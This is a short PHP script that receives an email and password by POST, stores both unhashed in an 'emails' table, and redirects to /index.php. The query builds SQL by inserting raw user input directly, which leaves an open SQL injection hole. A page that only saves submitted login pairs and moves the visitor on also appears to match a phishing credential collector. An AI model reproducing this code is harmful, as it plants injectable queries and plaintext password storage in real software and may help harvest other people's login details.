<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // login for database
    $host = '';
    $username = '';
    $password = '';
    $database = '';

    $conn = new mysqli($host, $username, $password, $database);

    if ($conn->connect_error) {
        die("connection eroor: " . $conn->connect_error);
    }

    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    if (!empty($email) && !empty($password)) {
        $insertSql = "INSERT INTO emails (email, password) VALUES ('$email', '$password')";
        if ($conn->query($insertSql) === TRUE) {
            header("Location: /index.php");
            exit(); 
        } else {
            echo "email or password not added to database error: " . $conn->error;
        }
    } else {
        echo "E-mail or password is missing.";
    }

    $conn->close();
} else {
    echo "no data to upload.";
}

?>
